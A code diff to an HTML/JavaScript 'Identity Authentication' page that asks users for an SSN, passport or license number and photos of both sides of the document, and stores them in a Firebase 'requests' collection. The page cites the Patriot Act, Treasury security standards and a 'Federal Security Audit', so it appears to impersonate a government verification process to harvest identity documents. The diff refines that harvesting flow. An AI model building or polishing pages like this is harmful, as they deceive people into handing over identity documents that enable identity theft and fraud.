@@ -30,6 +30,7 @@
         }
         select, input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #cbd5e1; box-sizing: border-box; font-family: inherit; font-size: 14px; }
         label { display: block; font-size: 12px; font-weight: 800; color: #1e3a8a; margin-bottom: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
+        #form-container { display: none; } /* Hidden by default until check is done */
     </style>
 </head>
 <body style="background: #f1f5f9;">
@@ -46,48 +47,54 @@
     </div>
 
     <div class="container" id="main-content">
-        <div class="card" style="margin-top: 20px; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #ba0c2f;">
-            <h2 style="color: #00274c; font-size: 22px; margin-bottom: 5px; letter-spacing: -0.5px;">Identity Authentication</h2>
-            
-            <div class="instruction-box">
-                <b style="display: block; margin-bottom: 5px;">FEDERAL COMPLIANCE NOTICE:</b> 
-                Pursuant to the <b>Patriot Act</b> and 31 CFR § 1010.230, you must provide a valid government ID. Images must be clear, uncropped, and show all four corners of the document.
+        <div id="form-container">
+            <div class="card" style="margin-top: 20px; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #ba0c2f;">
+                <h2 style="color: #00274c; font-size: 22px; margin-bottom: 5px; letter-spacing: -0.5px;">Identity Authentication</h2>
+                
+                <div class="instruction-box">
+                    <b style="display: block; margin-bottom: 5px;">FEDERAL COMPLIANCE NOTICE:</b> 
+                    Pursuant to the <b>Patriot Act</b> and 31 CFR § 1010.230, you must provide a valid government ID.
+                </div>
+                
+                <label>Authentication Document Type</label>
+                <select id="idType">
+                    <option value="Driver's License">U.S. Driver's License</option>
+                    <option value="Social Security Card">Social Security Card (SSN)</option>
+                    <option value="US Passport">U.S. Passport Book/Card</option>
+                    <option value="State ID">State-Issued Identification</option>
+                </select>
+
+                <label id="numLabel">Identification Number</label>
+                <input type="text" id="idNumber" placeholder="Enter ID number accurately">
+
+                <label>Front of Document</label>
+                <div class="upload-area" onclick="document.getElementById('fileFront').click()">
+                    <span style="font-size: 32px;">🪪</span>
+                    <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Upload Front</b>
+                    <input type="file" id="fileFront" hidden accept="image/*">
+                    <div class="preview-text" id="frontName"></div>
+                </div>
+
+                <label>Back of Document</label>
+                <div class="upload-area" onclick="document.getElementById('fileBack').click()">
+                    <span style="font-size: 32px;">🪪</span>
+                    <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Upload Back</b>
+                    <input type="file" id="fileBack" hidden accept="image/*">
+                    <div class="preview-text" id="backName"></div>
+                </div>
+
+                <button id="uploadBtn" style="background: #00274c; color: white; padding: 18px; border-radius: 12px; width: 100%; font-weight: 800; border: none; margin-top: 20px; cursor: pointer; text-transform: uppercase;">
+                    Submit for 2026 Verification
+                </button>
             </div>
-            
-            <label>Authentication Document Type</label>
-            <select id="idType">
-                <option value="Driver's License">U.S. Driver's License</option>
-                <option value="Social Security Card">Social Security Card (SSN)</option>
-                <option value="US Passport">U.S. Passport Book/Card</option>
-                <option value="State ID">State-Issued Identification</option>
-            </select>
+        </div>
 
-            <label id="numLabel">Identification Number</label>
-            <input type="text" id="idNumber" placeholder="Enter ID number accurately">
-
-            <label>Front of Document (High Resolution)</label>
-            <div class="upload-area" onclick="document.getElementById('fileFront').click()">
-                <span style="font-size: 32px;">🪪</span>
-                <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Click to Upload Front</b>
-                <input type="file" id="fileFront" hidden accept="image/*">
-                <div class="preview-text" id="frontName"></div>
-            </div>
-
-            <label>Back of Document (High Resolution)</label>
-            <div class="upload-area" onclick="document.getElementById('fileBack').click()">
-                <span style="font-size: 32px;">🪪</span>
-                <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Click to Upload Back</b>
-                <input type="file" id="fileBack" hidden accept="image/*">
-                <div class="preview-text" id="backName"></div>
-            </div>
-
-            <button id="uploadBtn" style="background: #00274c; color: white; padding: 18px; border-radius: 12px; width: 100%; font-weight: 800; border: none; margin-top: 20px; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px; box-shadow: 0 4px 15px rgba(0,39,76,0.2);">
-                Submit for 2026 Verification
-            </button>
+        <div id="loading-state" style="text-align: center; margin-top: 50px;">
+            <p style="color: #1e3a8a; font-weight: bold;">Checking Authentication Status...</p>
         </div>
 
         <p style="text-align:center; font-size:10px; color:#94a3b8; margin-top: 25px; padding: 0 20px; line-height: 1.6;">
-            🛡️ <b>ENCRYPTION ACTIVE:</b> All data is processed via Department of Treasury security standards. Misrepresentation of identity to obtain federal funds is a felony.
+            🛡️ <b>ENCRYPTION ACTIVE:</b> Secure 256-bit SSL.
         </p>
     </div>
 
@@ -109,62 +116,53 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        // Security & Submission Block Check
         onAuthStateChanged(auth, async (user) => {
             if (!user) {
                 window.location.href = 'index.html';
-            } else {
-                await reload(user);
-                if (!user.emailVerified) {
-                    window.location.href = 'verify.html';
-                    return;
-                }
+                return;
+            }
 
-                // CHECK STATUS
+            try {
                 const userSnap = await getDoc(doc(db, "users", user.uid));
-                if (userSnap.exists()) {
-                    const userData = userSnap.data();
-                    
-                    // LOCK SCREEN ONLY IF SUBMITTED OR APPROVED
-                    // If kycStatus is "DECLINED", this block is skipped and user sees the form
-                    if (userData.kycStatus === "SUBMITTED" || userData.status === "APPROVED") {
-                        document.getElementById('main-content').innerHTML = `
-                            <div class="card" style="margin-top: 50px; text-align: center; border-top: 6px solid ${userData.status === "APPROVED" ? '#10b981' : '#f59e0b'}; border-radius: 16px; padding: 40px 20px; background: white; box-shadow: 0 15px 35px rgba(0,0,0,0.05);">
-                                <span style="font-size: 50px;">${userData.status === "APPROVED" ? '✅' : '⏳'}</span>
-                                <h2 style="color: #00274c; margin-top: 15px;">${userData.status === "APPROVED" ? 'Authentication Successful' : 'Authentication Pending'}</h2>
-                                <div class="instruction-box" style="background: #fffbeb; color: #92400e; margin: 20px 0; border: 1px solid #fef3c7; border-radius: 10px; padding: 15px; font-size: 13px;">
-                                    ${userData.status === "APPROVED" 
-                                        ? 'Your identity has been verified. No further action is required.' 
-                                        : 'Your identity documents are currently undergoing a <b>Federal Security Audit</b>. You cannot resubmit while a review is in progress.'}
-                                </div>
-                                <button onclick="location.href='dashboard.html'" style="background: #00274c; color: white; padding: 15px; border-radius: 10px; width: 100%; font-weight: 800; border: none; margin-top: 10px; cursor: pointer;">
-                                    RETURN TO DASHBOARD
-                                </button>
+                const userData = userSnap.data() || {};
+                
+                const status = (userData.status || "").toUpperCase();
+                const kycStatus = (userData.kycStatus || "").toUpperCase();
+
+                // HIDE LOADING SPINNER
+                document.getElementById('loading-state').style.display = 'none';
+
+                // BLOCK LOGIC: If status is PENDING, SUBMITTED, or APPROVED (Not DECLINED)
+                if (kycStatus === "SUBMITTED" || status === "DOCUMENTS UNDER REVIEW" || status === "APPROVED") {
+                    document.getElementById('main-content').innerHTML = `
+                        <div class="card" style="margin-top: 50px; text-align: center; border-top: 6px solid ${status === "APPROVED" ? '#10b981' : '#f59e0b'}; border-radius: 16px; padding: 40px 20px; background: white; box-shadow: 0 15px 35px rgba(0,0,0,0.05);">
+                            <span style="font-size: 50px;">${status === "APPROVED" ? '✅' : '⏳'}</span>
+                            <h2 style="color: #00274c; margin-top: 15px;">${status === "APPROVED" ? 'Authentication Successful' : 'Authentication Pending'}</h2>
+                            <div class="instruction-box" style="background: #fffbeb; color: #92400e; margin: 20px 0; padding: 15px; border-radius: 10px;">
+                                ${status === "APPROVED" 
+                                    ? 'Your identity has been verified. Access granted.' 
+                                    : 'Your documents are currently undergoing a <b>Federal Security Audit</b>. Please wait for approval.'}
                             </div>
-                        `;
-                    }
+                            <button onclick="location.href='dashboard.html'" style="background: #00274c; color: white; padding: 15px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer;">
+                                RETURN TO DASHBOARD
+                            </button>
+                        </div>
+                    `;
+                } else {
+                    // SHOW FORM ONLY IF DECLINED OR NEW
+                    document.getElementById('form-container').style.display = 'block';
                 }
+            } catch (error) {
+                console.error("Status Error:", error);
+                document.getElementById('form-container').style.display = 'block';
             }
         });
 
-        // Dynamic Label Logic
-        document.getElementById('idType').addEventListener('change', (e) => {
-            const label = document.getElementById('numLabel');
-            const type = e.target.value;
-            if(type === "Social Security Card") label.innerText = "Social Security Number (SSN)";
-            else if(type === "US Passport") label.innerText = "Passport Number";
-            else label.innerText = type + " Number";
-        });
+        // FILE PREVIEWS & RESIZING
+        document.getElementById('fileFront').onchange = (e) => { if(e.target.files[0]) document.getElementById('frontName').innerText = "✅ FRONT_DOC_LOADED"; };
+        document.getElementById('fileBack').onchange = (e) => { if(e.target.files[0]) document.getElementById('backName').innerText = "✅ BACK_DOC_LOADED"; };
 
-        // File Selection Feedback
-        document.getElementById('fileFront').onchange = (e) => { 
-            if(e.target.files[0]) document.getElementById('frontName').innerText = "✅ FRONT_DOC_LOADED"; 
-        };
-        document.getElementById('fileBack').onchange = (e) => { 
-            if(e.target.files[0]) document.getElementById('backName').innerText = "✅ BACK_DOC_LOADED"; 
-        };
-
-        const resizeAndBase64 = (file) => new Promise((resolve, reject) => {
+        const resizeAndBase64 = (file) => new Promise((resolve) => {
             const reader = new FileReader();
             reader.readAsDataURL(file);
             reader.onload = (event) => {
@@ -172,51 +170,37 @@
                 img.src = event.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
-                    let width = img.width;
-                    let height = img.height;
-                    const max_size = 1000;
-                    if (width > height) {
-                        if (width > max_size) { height *= max_size / width; width = max_size; }
-                    } else {
-                        if (height > max_size) { width *= max_size / height; height = max_size; }
-                    }
-                    canvas.width = width;
-                    canvas.height = height;
+                    const max_size = 800;
+                    let width = img.width, height = img.height;
+                    if (width > height) { if (width > max_size) { height *= max_size / width; width = max_size; } }
+                    else { if (height > max_size) { width *= max_size / height; height = max_size; } }
+                    canvas.width = width; canvas.height = height;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(img, 0, 0, width, height);
-                    resolve(canvas.toDataURL('image/jpeg', 0.6));
+                    resolve(canvas.toDataURL('image/jpeg', 0.5));
                 };
             };
-            reader.onerror = error => reject(error);
         });
 
         const uploadBtn = document.getElementById('uploadBtn');
-
         uploadBtn.addEventListener('click', async () => {
             const user = auth.currentUser;
             const frontFile = document.getElementById('fileFront').files[0];
             const backFile = document.getElementById('fileBack').files[0];
             const idNum = document.getElementById('idNumber').value.trim();
-            const type = document.getElementById('idType').value;
 
-            if(!frontFile || !backFile || !idNum) return alert("REQUIRED: ID Number and both document sides must be uploaded.");
+            if(!frontFile || !backFile || !idNum) return alert("Required: All fields and images.");
 
-            uploadBtn.innerText = "SECURELY TRANSMITTING...";
+            uploadBtn.innerText = "TRANSMITTING...";
             uploadBtn.disabled = true;
 
             try {
                 const frontData = await resizeAndBase64(frontFile);
                 const backData = await resizeAndBase64(backFile);
 
-                const userSnap = await getDoc(doc(db, "users", user.uid));
-                const userData = userSnap.data();
-
                 await addDoc(collection(db, "requests"), {
                     userId: user.uid,
-                    userName: userData.fullName || "Valued User",
                     userEmail: user.email,
-                    type: "KYC_SUBMISSION",
-                    idType: type,
                     idNumber: idNum,
                     frontImg: frontData,
                     backImg: backData,
@@ -229,13 +213,10 @@
                     kycStatus: "SUBMITTED"
                 });
 
-                alert("TRANSMISSION SUCCESS: Your identity packet has been received for federal audit.");
+                alert("Success! Documents submitted.");
                 window.location.reload(); 
-
-            } catch(e) { 
-                console.error(e);
-                alert("HANDSHAKE ERROR: Data packet too large or network error. Please try again.");
-                uploadBtn.innerText = "Submit for 2026 Verification";
+            } catch(e) {
+                alert("Error submitting. Try again.");
                 uploadBtn.disabled = false;
             }
         });
